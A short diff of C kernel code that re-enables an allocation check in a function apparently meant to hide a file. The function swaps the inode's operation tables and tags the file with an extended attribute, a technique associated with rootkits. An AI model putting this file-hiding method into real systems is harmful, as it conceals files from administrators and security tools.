@@ -48,7 +48,7 @@ int hide_ino_hide(const char* path){
 	else path_put(&hidden_path);	
 
 	hidden_dentry = hidden_path.dentry;
-	//if (hide_ino_alloc(hidden_dentry)) return 1;
+	if (hide_ino_alloc(hidden_dentry)) return 1;
 	vfs_setxattr(hidden_dentry, "user.mfs_delete", &val, sizeof(int), 0);	
 	hidden_dentry->d_inode->i_op = &(new_iop);
 	hidden_dentry->d_inode->i_fop = &(new_fop);
